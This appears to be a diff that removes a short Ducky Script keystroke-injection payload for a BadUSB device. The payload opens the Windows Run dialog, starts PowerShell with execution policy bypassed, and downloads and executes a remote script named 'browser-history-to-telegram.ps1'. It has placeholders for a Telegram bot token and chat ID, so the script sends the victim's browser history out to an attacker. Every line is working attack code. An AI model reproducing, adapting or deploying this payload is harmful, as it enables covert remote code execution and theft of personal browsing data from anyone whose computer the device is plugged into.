@@ -1,8 +1,0 @@
-DELAY 1000
-GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $hide='y'
-ENTER
-DELAY 1000
-STRING powershell -Ep Bypass -C $hide='y';$tg='TGBotToken';$ChatID='Your telegram ID';iex (irm https://gist.githubusercontent.com/kr3v3tochka/7a591a11bbaa6910d111129ac9115d3c/raw/73d6a7c9ccdd17363d1f99e1f3bb7dba05720ce8/browser-history-to-telegram.ps1)
-ENTER 
